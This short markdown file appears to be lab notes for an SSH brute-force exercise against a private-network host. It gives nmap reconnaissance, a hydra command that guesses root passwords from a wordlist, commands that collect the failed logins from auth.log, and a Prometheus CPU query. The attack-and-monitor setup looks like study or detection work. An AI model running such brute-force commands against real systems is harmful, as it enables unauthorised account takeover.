# SSH Brute Force Commands

## Pre-check

```bash
ping 192.168.117.30
nmap -p 22 192.168.117.30
```

## Attack

```bash
hydra -l root -P small_wordlist.txt -vV ssh://192.168.117.30
```

## Ubuntu Logs

```bash
sudo tail -f /var/log/auth.log
grep "Failed password" /var/log/auth.log > attacks/brute-force/logs/ssh-bruteforce.log
```

## Prometheus Query

```promql
100 - (avg by(instance) (irate(node_cpu_seconds_total{mode="idle"}[5m])) * 100)
```
